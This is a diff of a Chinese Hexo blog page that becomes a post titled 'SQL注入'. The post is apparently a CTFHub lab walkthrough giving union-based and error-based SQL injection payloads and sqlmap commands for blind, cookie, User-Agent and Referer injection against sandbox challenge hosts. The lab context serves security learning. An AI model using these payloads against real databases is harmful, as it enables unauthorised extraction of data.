@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>归档: 2021/8 | Hexo</title>
+  <title>SQL注入 | Hexo</title>
 
   
     
@@ -399,151 +399,505 @@
 
     <!-- 内容区域 -->
     <main class="main" id="pjax-container" style="margin-top: 0;">
-      <div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"></div>
-<div class="bg-light-floor-archive" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -3;"></div>
-<div class="lazyload archive-header" data-original="https://pic1.zhimg.com/80/v2-1414b3a4b205e19060db18a20d08723a_1440w.jpg?source=1940ef5c" >
-  <div class="archive-header-title">
-    archive
-  </div>
-  <div class="archive-header-desc">
-  
-  <span class="title" id="archive-header-desc"></span>
-  <script>
-  function typedFn() {
-    const el = '#archive-header-desc';
-    const type = 'archive';
-    let desc = '愿你如风，被人温柔以待'
-    var typed = new Typed(el, {
-      strings: [desc],
-      startDelay: 100,
-      typeSpeed: 100,
-      loop: true,
-      backSpeed: 50,
-      showCursor: true
-    });
-  }
-  typedFn();
-</script>
-  
-  </div>
-  <div class="mask-box"></div>
-</div>
-
-<div class="archive-video">
-  <video class="full-video" autoplay loop muted>
-      <source style="width: 100%;height: 100vh;" src="/">
-  </video>
-  <div class="video-header-title">
-    archive
-  </div>
-  <div class="video-header-desc">
-  
-      <span class="title" id="archive-video-header-desc"></span>
-      <script>
-  function typedFn() {
-    const el = '#archive-video-header-desc';
-    const type = 'archive';
-    let desc = '愿你如风，被人温柔以待'
-    var typed = new Typed(el, {
-      strings: [desc],
-      startDelay: 100,
-      typeSpeed: 100,
-      loop: true,
-      backSpeed: 50,
-      showCursor: true
-    });
-  }
-  typedFn();
-</script>
       
-  </div>
-  <div class="mask-box"></div>
-</div>
-
-<!-- hash算法 -->
+ <!-- prismjs 代码高亮 -->
+ 
 
 
-<div class="archive-main">
-  <section class="archive">
-    <div class="archive-content">
-      <ul class="post-archive">
-        
-        
-          
-            
-            <div class="year" data-aos="zoom-in-up">
-                <div class="bullet"></div>
-                <a href="/archives/2021">2021</a>
-            </div>
-          
-          <li class="post-item" data-aos="fade-left">
-            
-            <div class="post-img-box">
-              <a href="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/" class="post-img lazyload" data-original="/medias/13.jpg" style="background-size: cover; 
-                background-position: center center;">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                <span class="post-date">08-30</span>
-              </div>
-              <a class="post-title" href="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
-            </div>
-          </li>
-        
-          
-          <li class="post-item" data-aos="fade-left">
-            
-            <div class="post-img-box">
-              <a href="/2021/08/30/SSRF/" class="post-img lazyload" data-original="/medias/4.jpg" style="background-size: cover; 
-                background-position: center center;">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                <span class="post-date">08-30</span>
-              </div>
-              <a class="post-title" href="/2021/08/30/SSRF/">SSRF</a>
-            </div>
-          </li>
-        
-          
-          <li class="post-item" data-aos="fade-left">
-            
-            <div class="post-img-box">
-              <a href="/2021/08/30/CTFHUB/" class="post-img lazyload" data-original="/medias/10.jpg" style="background-size: cover; 
-                background-position: center center;">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                <span class="post-date">08-30</span>
-              </div>
-              <a class="post-title" href="/2021/08/30/CTFHUB/">CTFHUB</a>
-            </div>
-          </li>
-        
-          
-          <li class="post-item" data-aos="fade-left">
-            
-            <div class="post-img-box">
-              <a href="/2021/08/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%B0RCE/" class="post-img lazyload" data-original="/medias/3.jpg" style="background-size: cover; 
-                background-position: center center;">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                <span class="post-date">08-09</span>
-              </div>
-              <a class="post-title" href="/2021/08/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%B0RCE/">渗透测试从代码审计到RCE</a>
-            </div>
-          </li>
-        
-      </ul>
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+<!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header lazyload" id="thumbnail_canvas" data-original="/medias/13.jpg" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        SQL注入
+      </span>
     </div>
-  </section>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fa fa-calendar"></i> 发表于：2021-08-30 |
+        </span>
+      
+
+      
+
+      
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
   
 </div>
+
+
+
+<div class="row justify-position">
+  <div class="main-content">
+    <article class="post post-detail">
+      
+      <div class="post-content">
+        <h2 id="1-整数型注入"><a href="#1-整数型注入" class="headerlink" title="1. 整数型注入"></a>1. 整数型注入</h2><p>?id=1<br>?id =1 order by 2<br>?id  =-1 union select 1,database()<br>?id = -1 union select 1,group_concat(schema_name)from information_schema.schemata<br>?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=’sqli’<br>?id = -1 union select 1,group_concat(column_name)from<br>information_schema.columns where table_schema=’sqli’ and table_name=’flag’<br>?id=-1 union select 1,group_concat(flag) from sqli.flag</p>
+<h2 id="2-字符型注入"><a href="#2-字符型注入" class="headerlink" title="2.字符型注入"></a>2.字符型注入</h2><p>?id = -1 union select 1,group_concat(schema_name)from information_schema.schemata #<br>-1’ union select 1,group_concat(column_name)from information_schema.columns where table_schema=’sqli’ and table_name=’flag’ #<br>-1’ union select 1,group_concat(flag) from sqli.flag #</p>
+<h2 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3.报错注入"></a>3.报错注入</h2><p>count(): 函数返回匹配指定条件的行数 ，count（<em>）函数返回表中的记录数<br>floor():  floor函数是用来向下取整呢个的，相当于去掉小数部分<br>rand()：rand()是随机取（0，1）中的一个数，但是给它一个参数后0，即rand(0)，并且传如floor(),即：floor(rand(0)*2)他就不再是随机了，序列0110110<br>concat()：用于连接两个字符串<br>group by x：x就是相当于as x,设一个别名<br>0x26: 十六进制数值，ASCII为’&amp;’，在回显中起到分割作用<br>*</em>产生原因：**<br>MYSQL报错注入通过构造payload让信息通过错误提示回显出来，主要应用与查询不回现内容，会打印错误信息；Update、insert等语句，会打印错误的信息。</p>
+<p>报错的原因是因为*<em>rand()函数在查询的时候会执行一次,插入的时候还会执行一次.**这就是整个语句报错的关键<br>前面说过floor(rand(0)<em>2) 前六位是</em></em>0110110**<br>**<br><strong>group by x先建立一个空表,用于分组.**然后进行分组查询,第一次rand()执行,查询的结果是0,因为是空表所以插入这条,而插入的时候rand()又执行了一次,所以表中的结果就是<br><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/20356902/1625921462006-5a08068c-4cee-4b14-9806-5d8c3dcc57bf.png#align=left&display=inline&height=69&margin=%5Bobject%20Object%5D&name=image.png&originHeight=138&originWidth=366&size=8037&status=done&style=none&width=183" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"><br>第一次执行完,接着执行rand()的值为1,因为表中存在,所以加1,表中结果成为<br><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/20356902/1625921473425-4d5d8ea1-e969-4a03-8f68-dd9094874513.png#align=left&display=inline&height=51&margin=%5Bobject%20Object%5D&name=image.png&originHeight=102&originWidth=333&size=7842&status=done&style=none&width=166.5" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"><br>到了第三次执行rand()是值为0,因为表中不存在所以要插入新的数据,**这次插入rand()再次执行,所以插入的又是1.而表中已经存在1了</strong><br><strong>此时插入因为重复出现同一个key,就会出现报错 重复出现key.而报错中会说明那个key有问题,我们的key中结合了想要了解的字符串root@localhost</strong><br><strong>这样就实现了报错注入,拿到了自己想要的数据</strong><br><strong><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/20356902/1625921529422-914183c5-82f2-460b-a280-8e84c540121e.png#align=left&display=inline&height=41&margin=%5Bobject%20Object%5D&name=image.png&originHeight=81&originWidth=308&size=13054&status=done&style=none&width=154" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"></strong><br>这就是整个报错注入的原理了,rand(),floor() group by 函数缺一不可.<br>学习博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/anweilx/p/12464859.html">https://www.cnblogs.com/anweilx/p/12464859.html</a><br>Payload:<br>Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</p>
+<p> 1 Union select count(*),concat((select database()),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</p>
+<p>1 Union select count(*),concat((select table_name from information_schema.tables where table_schema=’sqli’ limit 1,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</p>
+<p>1 Union select count(*),concat((select column_name from information_schema.columns where table_name=’flag’ limit 1,1),0x26,floor(rand(0)<em>2))x from information_schema.columns group by x;<br>在这时就会显示查询正确<br>1 Union select count(</em>),concat((select flag from sqli.flag),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</p>
+<h2 id="4，布尔盲注"><a href="#4，布尔盲注" class="headerlink" title="4，布尔盲注"></a>4，布尔盲注</h2><p>可以用脚本 但是我还是喜欢sqlmap。。。<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://challenge-5558451bf0e8beab.sandbox.ctfhub.com:10800/">http://challenge-5558451bf0e8beab.sandbox.ctfhub.com:10800/</a>?id=1” –current-db<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://challenge-5558451bf0e8beab.sandbox.ctfhub.com:10800/">http://challenge-5558451bf0e8beab.sandbox.ctfhub.com:10800/</a>?id=1” -D sqli –tables<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://challenge-5558451bf0e8beab.sandbox.ctfhub.com:10800/">http://challenge-5558451bf0e8beab.sandbox.ctfhub.com:10800/</a>?id=1” -D sqli -T flag –columns<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://challenge-5558451bf0e8beab.sandbox.ctfhub.com:10800/">http://challenge-5558451bf0e8beab.sandbox.ctfhub.com:10800/</a>?id=1” -D sqli  -T flag -C flag –dump</p>
+<h2 id="5-时间盲注"><a href="#5-时间盲注" class="headerlink" title="5, 时间盲注"></a>5, 时间盲注</h2><p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://challenge-37e515686643a8b5.sandbox.ctfhub.com:10800/?id=1&quot;">http://challenge-37e515686643a8b5.sandbox.ctfhub.com:10800/?id=1&quot;</a> –current-db<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://challenge-37e515686643a8b5.sandbox.ctfhub.com:10800/?id=1&quot;">http://challenge-37e515686643a8b5.sandbox.ctfhub.com:10800/?id=1&quot;</a> -D sqli –tables<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://challenge-37e515686643a8b5.sandbox.ctfhub.com:10800/?id=1&quot;">http://challenge-37e515686643a8b5.sandbox.ctfhub.com:10800/?id=1&quot;</a> -D sqli -T flag –columns<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://challenge-37e515686643a8b5.sandbox.ctfhub.com:10800/?id=1&quot;">http://challenge-37e515686643a8b5.sandbox.ctfhub.com:10800/?id=1&quot;</a> -D sqli -T flag -C flag –dump</p>
+<h2 id="6-Cookie注入"><a href="#6-Cookie注入" class="headerlink" title="6,Cookie注入"></a>6,Cookie注入</h2><p>用·Burp suite拦截，然后在coolie处进行注入<br>也可以使用sqlmap<br><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/20356902/1625990128891-98318d65-cba8-43f6-af0d-382d32ab8b8e.png#align=left&display=inline&height=496&margin=%5Bobject%20Object%5D&name=image.png&originHeight=992&originWidth=1264&size=134912&status=done&style=none&width=632" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"><br><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/20356902/1625990436590-4eb5e767-0e3d-4e5f-878e-3dd9fbbbd19a.png#align=left&display=inline&height=418&margin=%5Bobject%20Object%5D&originHeight=418&originWidth=698&size=0&status=done&style=none&width=698" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>sqlmap:<br>python sqlmap.py  -u “<a target="_blank" rel="noopener" href="http://challenge-766b19d72c73d8ca.sandbox.ctfhub.com:10800/">http://challenge-766b19d72c73d8ca.sandbox.ctfhub.com:10800/</a>“ –cookie “id=1”  –dbs –level 2<br>python sqlmap.py  -u “<a target="_blank" rel="noopener" href="http://challenge-766b19d72c73d8ca.sandbox.ctfhub.com:10800/">http://challenge-766b19d72c73d8ca.sandbox.ctfhub.com:10800/</a>“ –cookie “id=1”  -D sqli –tables –level 2<br>python sqlmap.py  -u “<a target="_blank" rel="noopener" href="http://challenge-766b19d72c73d8ca.sandbox.ctfhub.com:10800/">http://challenge-766b19d72c73d8ca.sandbox.ctfhub.com:10800/</a>“ –cookie “id=1”  -D sqli -T flag –columns –level 2<br>python sqlmap.py  -u “<a target="_blank" rel="noopener" href="http://challenge-766b19d72c73d8ca.sandbox.ctfhub.com:10800/">http://challenge-766b19d72c73d8ca.sandbox.ctfhub.com:10800/</a>“ –cookie “id=1”  -D sqli -T flag -C flag – dump –level 2 </p>
+<h2 id="7-UA注入"><a href="#7-UA注入" class="headerlink" title="7,UA注入"></a>7,UA注入</h2><p>User Agent 中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。<br>User Agent注入 可以用burpsuite拦截，也可以用sqlmap</p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://challenge-0db4dfe24728939b.sandbox.ctfhub.com:10080/">http://challenge-0db4dfe24728939b.sandbox.ctfhub.com:10080/</a>  –level 3 –dbs<br> <br>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://challenge-0db4dfe24728939b.sandbox.ctfhub.com:10080/">http://challenge-0db4dfe24728939b.sandbox.ctfhub.com:10080/</a>  –level 3 -D sqli –tables<br> <br>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://challenge-0db4dfe24728939b.sandbox.ctfhub.com:10080/">http://challenge-0db4dfe24728939b.sandbox.ctfhub.com:10080/</a>  –level 3 -D sqli -T qlediofgbs  –columns –dump</p>
+<h2 id="8，Refer注入"><a href="#8，Refer注入" class="headerlink" title="8，Refer注入"></a>8，Refer注入</h2><p>sqlmap可以在请求中伪HTTP的Referer头，当–level参数大于等于3时，会尝试进行refer注入</p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://challenge-c58db5e5b714ee25.sandbox.ctfhub.com:10080/">http://challenge-c58db5e5b714ee25.sandbox.ctfhub.com:10080/</a> –level 5 –dbs<br>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://challenge-c58db5e5b714ee25.sandbox.ctfhub.com:10080/">http://challenge-c58db5e5b714ee25.sandbox.ctfhub.com:10080/</a> –level 5 -D sqli –tables<br>pytho2 sqlmap.py -u <a target="_blank" rel="noopener" href="http://challenge-c58db5e5b714ee25.sandbox.ctfhub.com:10080/">http://challenge-c58db5e5b714ee25.sandbox.ctfhub.com:10080/</a> –level 5 -D sqli -T mpiqfobzkz –columns<br>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://challenge-c58db5e5b714ee25.sandbox.ctfhub.com:10080/">http://challenge-c58db5e5b714ee25.sandbox.ctfhub.com:10080/</a> –level 5 -D sqli -T mpiqfobzkz -C cppsiqpthc –dump</p>
+
+      </div>
+      <div class="post-tags-categories">
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>作者:  </strong>h0me1498192242</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>文章链接:  </strong>
+    <a href="/2021/08/30/SQL注入/" target="_blank" title="SQL注入">http://example.com/2021/08/30/SQL注入/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明:   </strong>
+      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      许可协议。转载请注明出处!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img lazyload" data-original="/medias/4.jpg" style="background-size: cover; 
+      background-position: center center;">
+    </div>
+    <a href="/2021/08/30/SSRF/" class="post-nav-link">
+      <div class="title">
+        下一篇: <i class="fa fa-angle-right"></i>
+        <div class="title-text">SSRF</div>
+      </div>
+      <!-- <div class="content">
+        内网访问尝试访问位于127.0.0.1的flag.php吧说的很明白
+伪协议读取文件尝试去读取一下Web目录下的flag
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+      <div id="appDonate" class="post-donate">
+  <div id="donate_board" class="donate_bar center" ref="donate">
+    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
+  </div>
+  <transition name="fade">
+    <div 
+      class="donate-box-mask"
+      v-cloak 
+      v-if="visible"
+      @click="cancelDialogDrawer()"
+    >
+    </div>
+  </transition>
+  <transition name="bounce">
+    <div class="donate-box" v-cloak v-if="visible">
+      <div class="donate-box_close">
+        <i class="fa fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
+      </div>
+      <div class="donate-box_title">
+        <h4>
+          你的赏识是我前进的动力
+        </h4>
+      </div>
+      <div class="donate-box_tab">
+        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
+          支付宝
+        </div>
+        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
+          微信
+        </div>
+      </div>
+      <div class="donate-box_img">
+        <div class="AlipayImg" v-if="tabActive === 'Alipay'">
+          <img src="/medias/zfb.jpg" alt="支付宝打赏" />
+        </div> 
+        <div class="WeChatpayImg" v-if="tabActive === 'WeChatpay'">
+          <img src="/medias/wx.jpg" alt="微信打赏" />
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDonate',
+    data: {
+      visible: false,
+      tabActive: 'Alipay',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        // function getScroll() {
+        //   return {
+        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
+        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
+        //   };
+        // }
+        this.top = $(document).scrollTop() // or getScroll().top
+        // console.log('aa', $('.main-content'));
+        body.style.cssText = 'overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+      changeTabActive(name) {
+        this.tabActive = name;
+      }
+    },
+    created() {}
+  })
+</script>
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      
+<section id="comments" style="padding: 1em; margin: 15px auto;"
+	class="animated bounceInUp">
+	<div id="vcomment" class="comment"></div>
+</section>
+<style>
+	#comments {
+		background: rgba(255,255,255,0.9);
+	}
+	#veditor {
+		background-image: url('https://img.zcool.cn/community/01a253594c71cfa8012193a329a77f.gif');
+		background-size: contain;
+		background-repeat: no-repeat;
+		background-position: right;
+		background-color: rgba(255, 255, 255, 0);
+		resize: vertical;
+	}
+	#veditor:focus{
+		background-position-y: 200px;
+		transition: all 0.2s ease-in-out 0s;
+	}
+	#vcomment .vcards .vcard .vh .vhead .vtag.vvisitor {
+		background-color: #42b983;
+	}
+	.v[data-class=v] .vbtn:active, .v[data-class=v] .vbtn:hover {
+		color: #42b983;
+		border-color: #42b983;
+	}
+	#vcomment .vcards .vcard .vhead .vsys i {
+		display: none;
+	}
+	/* 底部valine链接 */
+	#vcomment .vpower {
+		display: none;
+	}
+	
+	/* 底下注释是修改 名称和邮箱和网址输入框的样式 */
+	/* #vcomment .vheader {
+		display: flex;
+		justify-content: space-around;
+	}
+	
+	#vcomment .vheader .vnick {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	}
+
+	#vcomment .vheader .vmail {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	}
+
+	#vcomment .vheader .vlink {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	} */
+
+	img.vimg {
+		transition: all 1s;
+		/* 头像旋转时间为 1s */
+	}
+
+	img.vimg:hover {
+		transform: rotate(360deg);
+		-webkit-transform: rotate(360deg);
+		-moz-transform: rotate(360deg);
+		-o-transform: rotate(360deg);
+		-ms-transform: rotate(360deg);
+	}
+
+	#vcomment .vcards .vcard {
+		padding: 15px 20px 0 20px;
+		border-radius: 10px;
+		margin-bottom: 15px;
+		box-shadow: 0 0 4px 1px rgba(0, 0, 0, .12);
+		transition: all .3s
+	}
+
+	#vcomment .vcards .vcard:hover {
+		box-shadow: 0 0 8px 3px rgba(0, 0, 0, .12)
+	}
+
+	#vcomment .vcards .vcard .vh .vcard {
+		border: none;
+		box-shadow: none;
+	}
+</style>
+    
+  </div>
+
+
+  </div>
+
+  <!-- 目录 -->
+  <!-- 文章详情页右侧目录 -->
+
+  <div class="toc-aside">
+    <div class="toc-main">
+      <div class="toc-aside-title">
+        <i class="fa fa-list-ul" aria-hidden="true"></i><span>本文目录</span>
+        
+          <div class="toc-open-close">本文目录</div>
+        
+      </div>
+      <div class="toc-content">
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+  <!-- js在scripts目录下的的toc.ejs里面 -->
+  
+
+  <script>
+    function openBtnClickFn () {
+      let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
+      let open = eval('' || 'true');
+      openOrCloseBtn.click(function() {
+        if (open === true) {
+          $(".toc-aside").css({'width': 0, 'padding': 0});
+          $(".toc-content").css({'width': 0});
+          $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
+          $(".main-content").css({'width': '75%', 'margin': '10px auto'});
+          open = false;
+        } else {
+          $(".toc-aside").css({'width': '300px', 'padding': '0 10px'});
+          $(".toc-content").css({'width': '300px'});
+          $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
+          $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
+          open = true;
+        }
+      });
+    };
+    openBtnClickFn();
+    document.addEventListener('pjax:complete', function () {
+      openBtnClickFn();
+    })
+  </script>
+
+
+  
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;" :style="{'background-color': bgColor ? bgColor : 'transparent'}">
+    <transition-group tag="ul" :name="names">
+        <li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+            <img :src="image" class="bg-swiper-img">
+        </li>
+    </transition-group>
+</div>
+<script>
+    var vm = new Vue({
+        el: '#appBgSwiper',
+        data: {
+            names: '' || 'fade' || 'fade', // translate-fade fade
+            mark: 0,
+            img: [],
+            bgColor: '',
+            time: null
+        },
+        methods: {   //添加方法
+            change(i, m) {
+                if (i > m) {
+                    // this.names = 'fade';
+                } else if (i < m) {
+                    // this.names = 'fade';
+                } else {
+                    return;
+                }
+                this.mark = i;
+            },
+            prev() {
+                // this.names = 'fade';
+                this.mark--;
+                if (this.mark === -1) {
+                    this.mark = 3;
+                    return
+                }
+            },
+            next() {
+                // this.names = 'fade';
+                this.mark++;
+                if (this.mark === this.img.length) {
+                    this.mark = 0;
+                    return
+                }
+            },
+            autoPlay() {
+                // this.names = 'fade';
+                this.mark++;
+                if (this.mark === this.img.length) {
+                    this.mark = 0;
+                    return
+                }
+            },
+            play() {
+                let bgImgDelay = '' || '180000'
+                let delay = parseInt(bgImgDelay) || 180000;
+                this.time = setInterval(this.autoPlay, delay);
+            },
+            enter() {
+                clearInterval(this.time);
+            },
+            leave() {
+                this.play();
+            }
+        },
+        created() {
+            this.play()
+        },
+        beforeDestroy() {
+            clearInterval(this.time);
+        },
+        mounted() {
+            let prop = ''|| '';
+            let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://') 
+            if (isImg) {
+                let img = prop.split(',');
+                let configRoot = '/'
+                let arrImg = [];
+                img.forEach(el => {
+                    var Expression=/http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+			        var objExp = new RegExp(Expression);
+
+                    if(objExp.test(el)) {
+                        // http or https
+                        arrImg.push(el);
+                    } else {
+                        // 非http or https开头
+                        // 本地文件
+                        let firstStr = el.charAt(0);
+                        if (firstStr == '/') {
+                            el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+                        }
+                        el = configRoot + el;
+                        arrImg.push(el);
+                    }
+                })
+                this.img = arrImg;
+            } else {
+                this.bgColor = prop;
+            }
+        }
+    })
+</script>
+
+<style>
+    .bg-swiper-box {
+        position: absolute;
+        display: block;
+        width: 100%;
+        height: 100%;
+    }
+    .bg-swiper-img {
+        object-fit: cover;
+        width: 100%;
+        height: 100%;
+    }
+</style>
+
     </main>
 
     <!-- 页脚 -->
